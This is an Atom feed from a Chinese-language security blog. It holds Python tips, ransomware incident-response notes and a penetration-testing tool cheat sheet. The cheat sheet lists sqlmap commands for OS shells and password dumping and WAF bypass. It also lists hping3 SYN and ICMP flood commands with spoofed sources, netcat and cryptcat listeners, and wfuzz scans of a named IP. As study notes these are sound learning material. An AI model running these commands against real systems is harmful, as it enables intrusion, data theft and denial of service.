True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;判断奇偶数&quot;&gt;&lt;a href=&quot;#判断奇偶数&quot; class=&quot;headerlink&quot; title=&quot;判断奇偶数&quot;&gt;&lt;/a&gt;判断奇偶数&lt;/h2&gt;&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; i &amp;amp; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;python矩阵旋转&quot;&gt;&lt;a href=&quot;#python矩阵旋转&quot; class=&quot;headerlink&quot; title=&quot;python矩阵旋转&quot;&gt;&lt;/a&gt;python矩阵旋转&lt;/h2&gt;&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;rotate&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;self, matrix&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    matrix[:] = &lt;span class=&quot;built_in&quot;&gt;map&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;list&lt;/span&gt;,&lt;span class=&quot;built_in&quot;&gt;zip&lt;/span&gt;(*matrix[::-&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;matrix[::-1]&lt;/code&gt;: 上下翻转&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;安全随机数&quot;&gt;&lt;a href=&quot;#安全随机数&quot; class=&quot;headerlink&quot; title=&quot;安全随机数&quot;&gt;&lt;/a&gt;安全随机数&lt;/h2&gt;&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; secrets&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;secret_generator=secrets.SystemRandom()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;secret_generator.randint(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;全局变量与局部变量&quot;&gt;&lt;a href=&quot;#全局变量与局部变量&quot; class=&quot;headerlink&quot; title=&quot;全局变量与局部变量&quot;&gt;&lt;/a&gt;全局变量与局部变量&lt;/h2&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>应急响应笔记</title>
    <link href="https://hejueyun.github.io/posts/c97b424c/"/>
    <id>https://hejueyun.github.io/posts/c97b424c/</id>
    <published>2020-09-21T01:49:36.000Z</published>
    <updated>2021-05-13T12:25:08.952Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><img src="/posts/c97b424c/2020-09-21-09-58-55.png" width height="250"><span id="more"></span><h2 id="常见的应急响应事件分类"><a href="#常见的应急响应事件分类" class="headerlink" title="常见的应急响应事件分类"></a>常见的应急响应事件分类</h2><table><thead><tr><th>web入侵</th><th>系统入侵</th><th>网络攻击</th></tr></thead><tbody><tr><td>网页挂马</td><td>病毒木马</td><td>DDOS攻击</td></tr><tr><td>主页篡改</td><td>勒索软件</td><td>DNS劫持</td></tr><tr><td>Webshell</td><td>远控后门</td><td>ARP欺骗</td></tr></tbody></table><h3 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h3><blockquote><p>勒索软件，又称勒索病毒，是一种特殊的恶意软件，又被人归类为“阻断访问式攻击”（denial-of-access attack），其与其他病毒最大的不同在于手法以及中毒方式。其中一种勒索软件仅是单纯地将受害者的电脑锁起来，而另一种则系统性地加密受害者硬盘上的文件。所有的勒索软件都会要求受害者缴纳赎金以取回对电脑的控制权，或是取回受害者根本无从自行获取的解密密钥以便解密文件</p><p>勒索软件通常透过木马病毒的形式传播，将自身为掩盖为看似无害的文件，通常会通过假冒成普通的电子邮件等社会工程学方法欺骗受害者点击链接下载，但也有可能与许多其他蠕虫病毒一样利用软件的漏洞在联网的电脑间传播</p><hr><ul><li>网络和邮件的内容过滤代理服务器</li><li>限制级别访问</li><li>以密码上锁特定功能</li><li>不间断的员工警觉性训练</li></ul></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://bypass007.github.io/Emergency-Response-Notes/">前言 · 应急响应实战笔记</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;常用命令&quot;&gt;&lt;a href=&quot;#常用命令&quot; class=&quot;headerlink&quot; title=&quot;常用命令&quot;&gt;&lt;/a&gt;常用命令&lt;/h2&gt;&lt;img src=&quot;/posts/c97b424c/2020-09-21-09-58-55.png&quot; width height=&quot;250&quot;&gt;

&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;常见的应急响应事件分类&quot;&gt;&lt;a href=&quot;#常见的应急响应事件分类&quot; class=&quot;headerlink&quot; title=&quot;常见的应急响应事件分类&quot;&gt;&lt;/a&gt;常见的应急响应事件分类&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;web入侵&lt;/th&gt;
&lt;th&gt;系统入侵&lt;/th&gt;
&lt;th&gt;网络攻击&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;网页挂马&lt;/td&gt;
&lt;td&gt;病毒木马&lt;/td&gt;
&lt;td&gt;DDOS攻击&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;主页篡改&lt;/td&gt;
&lt;td&gt;勒索软件&lt;/td&gt;
&lt;td&gt;DNS劫持&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Webshell&lt;/td&gt;
&lt;td&gt;远控后门&lt;/td&gt;
&lt;td&gt;ARP欺骗&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&quot;勒索病毒&quot;&gt;&lt;a href=&quot;#勒索病毒&quot; class=&quot;headerlink&quot; title=&quot;勒索病毒&quot;&gt;&lt;/a&gt;勒索病毒&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;勒索软件，又称勒索病毒，是一种特殊的恶意软件，又被人归类为“阻断访问式攻击”（denial-of-access attack），其与其他病毒最大的不同在于手法以及中毒方式。其中一种勒索软件仅是单纯地将受害者的电脑锁起来，而另一种则系统性地加密受害者硬盘上的文件。所有的勒索软件都会要求受害者缴纳赎金以取回对电脑的控制权，或是取回受害者根本无从自行获取的解密密钥以便解密文件&lt;/p&gt;
&lt;p&gt;勒索软件通常透过木马病毒的形式传播，将自身为掩盖为看似无害的文件，通常会通过假冒成普通的电子邮件等社会工程学方法欺骗受害者点击链接下载，但也有可能与许多其他蠕虫病毒一样利用软件的漏洞在联网的电脑间传播&lt;/p&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;网络和邮件的内容过滤代理服务器&lt;/li&gt;
&lt;li&gt;限制级别访问&lt;/li&gt;
&lt;li&gt;以密码上锁特定功能&lt;/li&gt;
&lt;li&gt;不间断的员工警觉性训练&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://bypass007.github.io/Emergency-Response-Notes/&quot;&gt;前言 · 应急响应实战笔记&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</summary>
    
    
    
    <category term="Security" scheme="https://hejueyun.github.io/categories/Security/"/>
    
    
    <category term="Note" scheme="https://hejueyun.github.io/tags/Note/"/>
    
  </entry>
  
  <entry>
    <title>安全工具笔记</title>
    <link href="https://hejueyun.github.io/posts/58ca39f2/"/>
    <id>https://hejueyun.github.io/posts/58ca39f2/</id>
    <published>2020-09-14T12:41:21.000Z</published>
    <updated>2021-04-25T07:09:09.416Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><h3 id="数据库注入"><a href="#数据库注入" class="headerlink" title="数据库注入"></a>数据库注入</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 谷歌注入</span></span><br><span class="line"><span class="comment"># 相当于加上https://www.google.com.hk/search?q=inurl:php?id=</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Cookie注入，猜解表</span></span><br><span class="line">sqlmap -u url --cookie <span class="string">&quot;id=31&quot;</span> --table --level 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取一个Shell</span></span><br><span class="line">sqlmap -u url --sql-shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">sqlmap -u url --os-cmd=ipconfig</span><br><span class="line">sqlmap -u url --os-shell <span class="comment"># 选择语言</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mysql注入(前提是mysql)</span></span><br><span class="line">sqlmap -u url --dbs <span class="comment"># 找库</span></span><br><span class="line">sqlmap -u url -D dbname --table <span class="comment"># 找表</span></span><br><span class="line">sqlmap -u url -D dataname -T table_name --columns <span class="comment"># 找列</span></span><br><span class="line">sqlmap -u url -D dataname -T table_name -c <span class="string">&quot;id,user,password&quot;</span> --dump <span class="comment"># 获取字段的值(假如扫描出id,user,password字段)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># post登陆框注入</span></span><br><span class="line"><span class="comment"># 配置burp代理(127.0.0.1:8080)以拦截请求</span></span><br><span class="line"><span class="comment"># 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</span></span><br><span class="line">sqlmap -r search-test.txt -p tfUPass</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 请求延迟</span></span><br><span class="line">--delay 1 --safe-freq</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过WAF防火墙</span></span><br><span class="line">--batch --tamper <span class="string">&quot;space2morehash.py&quot;</span></span><br><span class="line"><span class="comment"># 使用注释符#(%23) 再就是使用随机的字符串和一个换行符(%0A)来替换空格</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 浏览器</span></span><br><span class="line">--random-agent</span><br></pre></td></tr></table></figure><p>参数</p><ul><li>u url</li><li>p parameter eg. <code>?id=</code></li><li>batch bat 批处理</li><li>level</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload,5级包含的payload最多。</span><br><span class="line">http cookie在2级时可以检测</span><br><span class="line">HTTP user-Agent&#x2F;Referer在3级时就会检测</span><br></pre></td></tr></table></figure><p>注意url里要包括参数，不然报错</p><blockquote><p> no parameter(s) found for testing in the provided data</p></blockquote><blockquote><p>在实际中我们发现，这样得到的IP地址有很多是没有响应的，如果对所有的地址进行扫描，会非常费时费力，我们要进行二次过滤，使用Python批量对地址进行请求， 过滤掉不响应或响应过慢的网页</p><ul><li><code>requests.get(ip,timeout=6)</code></li></ul></blockquote><span id="more"></span><h3 id="os-shell原理"><a href="#os-shell原理" class="headerlink" title="os-shell原理"></a>os-shell原理</h3><blockquote><p>sqlmap上传一个上传功能的马</p><ul><li>base64编码</li><li>通过into outfile进行文件的写入</li></ul><p>shell传参进行命令执行</p><ul><li>上传一个二进制库</li><li>mysql、PostgreSQL：sys_exec()和sys_eval()</li><li>sql server：xp_cmdshell</li></ul><p>删除shell</p></blockquote><p>必要条件</p><blockquote><ul><li>拥有网站的写入权限</li><li><code>Secure_file_priv</code>参数为空或者为指定路径</li></ul></blockquote><h2 id="AWVS-Acunetix-Web-Vulnerability-Scanner"><a href="#AWVS-Acunetix-Web-Vulnerability-Scanner" class="headerlink" title="AWVS(Acunetix Web Vulnerability Scanner)"></a>AWVS(Acunetix Web Vulnerability Scanner)</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker pull secfa/docker-awvs</span><br><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 容器的相关信息</span></span><br><span class="line">awvs13 username: admin@admin.com</span><br><span class="line">awvs13 password: Admin123</span><br><span class="line"></span><br><span class="line">https://127.0.0.1:13443/ </span><br></pre></td></tr></table></figure><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>实现原理</p><blockquote><p>网络上传输的数据包通过网卡进入到网络协议分析器系统。协议分析器所使用的网卡和网卡 驱动程序必须能够支持“混杂模式操作（Promiscuous Mode Operation）”。因为只有运行在混杂模式下的网卡才能够捕获到网络中传输到其他设备的“广播数据包、多播数据包、单播数据包以及错误数据包等等”，两者一起协同工作</p></blockquote><img src="/posts/58ca39f2/2020-09-15-10-24-28.png" width height="250"><h2 id="nmap-zmap"><a href="#nmap-zmap" class="headerlink" title="nmap zmap"></a>nmap zmap</h2><blockquote><ul><li>zmap扫得快，漏的多，适合做个大范围的态势了解。</li><li>nmap扫的慢，更准确，适合对目标网络做详细扫描。</li><li>masscan不太清楚，应该是趋近与zmap的东西</li></ul></blockquote><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">systemctl start postgresql</span><br><span class="line"><span class="comment"># 建立数据库缓存</span></span><br><span class="line">msfconsole db_rebuild_cache</span><br></pre></td></tr></table></figure><p>术语</p><blockquote><ul><li>Exploit，攻击工具/代码 </li><li>Payload，攻击载荷 </li><li>Shellcode </li><li>Module，模块 </li><li>Listener，监听器</li></ul></blockquote><ul><li><p>使用Metasploit框架的基本步骤包括：</p><ul><li>选择并配置一个攻击代码(exploit, 利用漏洞来进入目标系统的代码）；</li><li>（可选）检查目标系统是否会被此代码影响；</li><li>选择并配置一个有效负载 (payload, 在成功进入后在目标系统上执行的代码；例如，一个远端壳层或一个VNC服务器）；</li><li>选择编码方式，使入侵预防系统，忽略已被编码的有效负载；</li><li>执行攻击代码。</li></ul></li><li><p><strong>这种允许任何攻击代码和任何有效负载进行随意组合的模块化的结构是Metasploit框架的主要优势</strong></p></li><li><p><a href="https://uuzdaisuki.com/2018/05/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6metasploit/">渗透测试框架metasploit | Leticia‘s Blog </a></p></li></ul><h2 id="隧道工具"><a href="#隧道工具" class="headerlink" title="隧道工具"></a>隧道工具</h2><p>netcat通信</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp port</span><br><span class="line">nc url port</span><br></pre></td></tr></table></figure><h3 id="应用层隧道"><a href="#应用层隧道" class="headerlink" title="应用层隧道"></a>应用层隧道</h3><ul><li>略</li></ul><h3 id="传输层隧道：cryptcat"><a href="#传输层隧道：cryptcat" class="headerlink" title="传输层隧道：cryptcat"></a>传输层隧道：cryptcat</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cryptcat -nlvp 2222 -k passwd</span><br><span class="line">cryptcat url 2222 -k passwd</span><br></pre></td></tr></table></figure><h3 id="网络层隧道"><a href="#网络层隧道" class="headerlink" title="网络层隧道"></a>网络层隧道</h3><ul><li>ip<ul><li>传输模式esp封装</li></ul></li><li>icmp</li></ul><h2 id="ddos工具"><a href="#ddos工具" class="headerlink" title="ddos工具"></a>ddos工具</h2><h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h3><p><em>说的难听是dos，说的好听是压力测试</em></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多端口扫描</span></span><br><span class="line">hping3 -8 1-1024 192.168.100.102</span><br><span class="line"><span class="comment"># 文件发送</span></span><br><span class="line">hping3 -2 -p 1373 192.168.100.102 -d 100 -E test.txt <span class="comment"># d: 数据大小</span></span><br><span class="line"><span class="comment"># 接收端：</span></span><br><span class="line">nc -lp 1373 -u -w 5 &gt; recv.txt &amp;&amp; cat recv.txt  <span class="comment"># w :超时时间</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DOS攻击</span></span><br><span class="line"><span class="comment">## Syn Flood攻击 -S</span></span><br><span class="line">hping3 -c 1000 -d 120 -S -p 80 –-flood –-rand-source 192.168.100.1</span><br><span class="line"></span><br><span class="line">-c 指定连接数 -p 目标端口</span><br><span class="line">-d 指定数据部分的大小 -S 攻击类型是Syn flood</span><br><span class="line">–flood 以泛洪的方式攻击 –rand-source 随机产生伪造源地址</span><br><span class="line"></span><br><span class="line"><span class="comment">## TCP Flood攻击 -L</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## UDP Flood -udp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## ICMP Flood -icmp</span></span><br><span class="line">hping3 -q -n -d 200 –icmp –flood -a 11.11.11.11 192.168.100.1</span><br><span class="line"></span><br><span class="line">-q安静模式 -n不解析域名 -a指定伪造IP</span><br></pre></td></tr></table></figure><h2 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h2><blockquote><p>Wfuzz是一款为了评估WEB应用而生的Fuzz（Fuzz是爆破的一种手段）工具，它基于一个简单的理念，即用给定的Payload去fuzz。它允许在HTTP请求里注入任何输入的值，针对不同的WEB应用组件进行多种复杂的爆破攻击</p><ul><li>wfuzz本身自带字典</li></ul></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目录扫描</span></span><br><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/webservices/ws-files.txt --hc 404 http://x.x.x.x:9012/admin/FUZZ</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件扫描</span></span><br><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/webservices/ws-files.txt --hc 404 http://111.59.90.59:9012/admin/FUZZ</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试URL中的参数</span></span><br><span class="line">wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ</span><br></pre></td></tr></table></figure><img src="/posts/58ca39f2/2020-09-15-23-41-42.png" width height="250"><h2 id="auditd"><a href="#auditd" class="headerlink" title="auditd"></a>auditd</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前审计规则</span></span><br><span class="line">auditctl -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建临时规则</span></span><br><span class="line">auditctl -w /etc/passwd -p rxwa</span><br><span class="line"><span class="comment"># -w :审计监视的路径</span></span><br><span class="line"><span class="comment"># -p：目录或者文件的权限 ,rxwa分别是读、执行、写、属性</span></span><br><span class="line"></span><br><span class="line">vim /etc/audit/audit.rules</span><br><span class="line">-a &lt;list&gt;,&lt;action&gt; &lt;options&gt;</span><br></pre></td></tr></table></figure><blockquote><p>auditd的审计日志是在<code>/var/log/audit/audit.log</code>这里，如果设置的rules较多，日志会很大，所以要定期删除日志，在删除日志的时候注意要重启auditd服务</p><ul><li>执行命令在<code>comm=...</code></li></ul></blockquote><h2 id="Windows下D盾等，Linux下河马"><a href="#Windows下D盾等，Linux下河马" class="headerlink" title="Windows下D盾等，Linux下河马"></a>Windows下D盾等，Linux下河马</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.cnblogs.com/ichunqiu/p/5805108.html">SQLMAP注入教程-11种常见SQLMAP使用方法详解 - i春秋学院 - 博客园</a></li><li><a href="https://www.sqlsec.com/2020/04/awvs.html">AWVS13.X Windows、Linux、Docker | 国光</a></li><li><a href="https://xz.aliyun.com/t/7942">sqlmap –os-shell原理 - 先知社区</a></li><li><a href="https://blog.csdn.net/lixiaogang_theanswer/article/details/103198411">Wireshark之抓包原理剖析_此处不归牛顿管~-CSDN博客</a></li><li><a href="https://mochazz.github.io/2017/07/23/hping3/#Syn-Flood%E6%94%BB%E5%87%BB">hping3使用 | Mochazz’s blog</a></li><li><a href="https://www.zhihu.com/question/51926399/answer/128147667">zmap,nmap,masscan等端口扫描工具的比较？ - 山山是个酱的回答 - 知乎</a></li><li><a href="https://www.freebuf.com/column/163632.html">史上最详[ZI]细[DUO]的wfuzz中文教程（二）——wfuzz 基本用法 - FreeBuf网络安全行业门户</a></li><li><a href="https://xz.aliyun.com/t/3007">记一份基础Metasploit教程 - 先知社区</a></li><li><a href="https://www.anquanke.com/post/id/86926">【技术分享】Linux应急响应姿势浅谈 - 安全客，安全资讯平台</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;sqlmap&quot;&gt;&lt;a href=&quot;#sqlmap&quot; class=&quot;headerlink&quot; title=&quot;sqlmap&quot;&gt;&lt;/a&gt;sqlmap&lt;/h2&gt;&lt;h3 id=&quot;数据库注入&quot;&gt;&lt;a href=&quot;#数据库注入&quot; class=&quot;headerlink&quot; title=&quot;数据库注入&quot;&gt;&lt;/a&gt;数据库注入&lt;/h3&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 谷歌注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 相当于加上https://www.google.com.hk/search?q=inurl:php?id=&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Cookie注入，猜解表&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sqlmap -u url --cookie &lt;span class=&quot;string&quot;&gt;&amp;quot;id=31&amp;quot;&lt;/span&gt; --table --level 2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 获取一个Shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sqlmap -u url --sql-shell&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sqlmap -u url --os-cmd=ipconfig&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sqlmap -u url --os-shell &lt;span class=&quot;comment&quot;&gt;# 选择语言&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 